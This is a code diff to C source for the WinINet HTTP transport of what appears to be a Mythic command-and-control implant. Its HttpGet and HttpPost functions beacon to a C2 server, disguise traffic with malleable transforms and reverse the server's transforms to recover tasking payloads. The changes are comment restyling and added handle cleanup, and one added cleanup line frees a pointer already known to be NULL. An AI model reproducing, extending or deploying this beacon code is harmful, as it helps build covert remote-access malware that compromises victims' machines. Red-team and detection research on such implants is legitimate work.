@@ -140,7 +140,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	TransformApply(&transform, package->buffer, package->length, S_C2_GET_CLIENT);
 
-	// Add any URI parameters (e.g., /test?value=1&other=2)
+	/* Add any URI parameters (e.g., /test?value=1&other=2) */
 	if (strlen(transform.uriParams))
 		snprintf(finalUri, sizeof(finalUri), "%s%s", transform.uri, transform.uriParams);
 	else
@@ -171,7 +171,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	DWORD error = 0;
 
-	// Check if InternetOpenA failed
+	/* Check if InternetOpenA failed */
 	if (hInternet == NULL)
 	{
 		error = GetLastError();
@@ -181,12 +181,14 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 	}
 
 	HttpUpdateSettings(hInternet);
-	// Send request
+
+	/* Send request */
 	if (!HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength))
 	{
 		error = GetLastError();
 		_err("HttpSendRequestA failed with error code: %d", error);
 		TransformDestroy(&transform);
+		InternetCloseHandle(hInternet);
 		return FALSE;
 	}
 	
@@ -201,7 +203,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	BYTE buffer[MAX_READ]; // 4kb
 	
-	// Check if we can read the response and get the available bytes
+	/* Check if we can read the response and get the available bytes */
 	if (HttpCheckResponse(hInternet) && InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
 		
 		//_dbg("Response is %d bytes ", bytesAvailable);
@@ -214,7 +216,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 		}
 		
 		do {
-			// Clear the buffer for the next read
+			/* Clear the buffer for the next read */
 			memset(buffer, 0, MAX_READ);
 
 			if (!InternetReadFile(hInternet, buffer, MAX_READ, &bytesRead)) {
@@ -225,12 +227,12 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 				return FALSE;
 			}
 
-			// Log how many bytes were read in this iteration
+			/* Log how many bytes were read in this iteration */
 			// //_dbg("[HTTP] Bytes read this iteration: %d", bytesRead);
 
 			if (bytesRead == 0) break; 	// No more data
 
-			// Check if more memory is needed
+			/* Check if more memory is needed */
 			if (totalBytesRead + bytesRead > bytesAvailable) {
 				// //_dbg("[HTTP] Expanding buffer size.");
 				bytesAvailable = totalBytesRead + bytesRead;
@@ -243,13 +245,13 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 				}
 			}
 
-			// Accumulate read data
+			/* Accumulate read data */
 			memcpy(dataBuffer + totalBytesRead, buffer, bytesRead);
 			totalBytesRead += bytesRead;
 
 		} while (bytesRead > 0);
 
-		// Undo server's transformations to get mythic payload 
+		/* Undo server's transformations to get mythic payload */
 		if (!TransformReverse((char*)dataBuffer, totalBytesRead, &recoveredLen, S_C2_GET_SERVER, MAXGET))
 		{
 			_err("Failed to reverse transformations.");
@@ -258,7 +260,7 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 			return FALSE;
 		}
 
-		// Output data buffer and size
+		/* Output data buffer and size */
 		*ppOutData = dataBuffer;
 		*pOutLen = recoveredLen;
 
@@ -269,7 +271,6 @@ BOOL HttpGet(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 	}
 
 	InternetCloseHandle(hInternet);
-
 	return success;
 }
 
@@ -324,7 +325,7 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	DWORD error = 0;
 
-	// Check if InternetOpenA failed
+	/* Check if InternetOpenA failed */
 	if (hInternet == NULL)
 	{
 		error = GetLastError();
@@ -335,12 +336,13 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 	HttpUpdateSettings(hInternet);
 
-	// Send request
+	/* Send request */
 	if (!HttpSendRequestA(hInternet, transform.headers, strlen(transform.headers), transform.body, transform.bodyLength))
 	{
 		error = GetLastError();
 		_err("HttpSendRequestA failed with error code: %d", error);
 		TransformDestroy(&transform);
+		InternetCloseHandle(hInternet);
 		return FALSE;
 	}
 	
@@ -352,10 +354,10 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 	DWORD totalBytesRead = 0;
 	DWORD bytesRead = 0;
 	BYTE* dataBuffer = NULL;
-	BYTE buffer[MAX_READ]; // Assuming MAX_READ is defined (e.g., 1024)
+	BYTE buffer[MAX_READ];
 	BOOL success = FALSE;
 	
-	// Check if we can read the response and get the available bytes
+	/* Check if we can read the response and get the available bytes */
 	if (HttpCheckResponse(hInternet) && InternetQueryDataAvailable(hInternet, &bytesAvailable, 0, 0) && bytesAvailable > 0) {
 		
 		//_dbg("Response contains %d bytes ", bytesAvailable);
@@ -363,6 +365,7 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 		dataBuffer = LocalAlloc(LPTR, bytesAvailable + 1);
 		if (!dataBuffer) {
 			_err("[HTTP] Memory allocation failed.\n");
+			InternetCloseHandle(hInternet);
 			return FALSE;
 		}
 		
@@ -374,29 +377,29 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 			if (!InternetReadFile(hInternet, buffer, MAX_READ, &bytesRead)) {
 				DWORD err = GetLastError();
 				_err("[HTTP] Error %u in InternetReadFile.\n", err);
+				InternetCloseHandle(hInternet);
 				LocalFree(dataBuffer);
 				return FALSE;
 			}
-
-			// Log how many bytes were read in this iteration
-			// //_dbg("[HTTP] Bytes read this iteration: %d", bytesRead);
 
 			if (bytesRead == 0) {
 				break;
 			}
 
-			// Check if more memory is needed
+			/* Check if more memory is needed */
 			if (totalBytesRead + bytesRead > bytesAvailable) {
-				// //_dbg("[HTTP] Expanding buffer size.");
-				bytesAvailable = totalBytesRead + bytesRead; // Increase the buffer size
+				/* Expanding buffer size */
+				bytesAvailable = totalBytesRead + bytesRead;
 				dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
 				if (!dataBuffer) {
 					_err("[HTTP] Memory reallocation failed.\n");
+					InternetCloseHandle(hInternet);
+					LocalFree(dataBuffer);
 					return FALSE;
 				}
 			}
 
-			// Accumulate read data
+			/* Accumulate read data */
 			memcpy(dataBuffer + totalBytesRead, buffer, bytesRead);
 			totalBytesRead += bytesRead;
 
@@ -406,11 +409,13 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 
 		if (!TransformReverse((char*)dataBuffer, totalBytesRead, &recoveredLen, S_C2_POST_SERVER, MAXGET))
 		{
+			_err("[HTTP] Failed to reverse transformations.\n");
+			InternetCloseHandle(hInternet);
 			LocalFree(dataBuffer);
 			return FALSE;
 		}
 
-		// Output data addresses
+		/* Output data addresses */
 		*ppOutData = dataBuffer;
 		*pOutLen = recoveredLen;
 
@@ -419,7 +424,6 @@ BOOL HttpPost(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 	else {
 		_err("[HTTP] No data available or response check failed. ERROR : %d\n", GetLastError());
 	}
-
 
 	InternetCloseHandle(hInternet);
 	return success;
@@ -532,8 +536,8 @@ void HttpConfigureHttp(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR 
 
 void HttpClose(void)
 {
-	InternetCloseHandle(gInternetConnect);
-	InternetCloseHandle(gInternetOpen);
+	if (gInternetConnect) InternetCloseHandle(gInternetConnect);
+	if (gInternetOpen) InternetCloseHandle(gInternetOpen);
 }
 
 
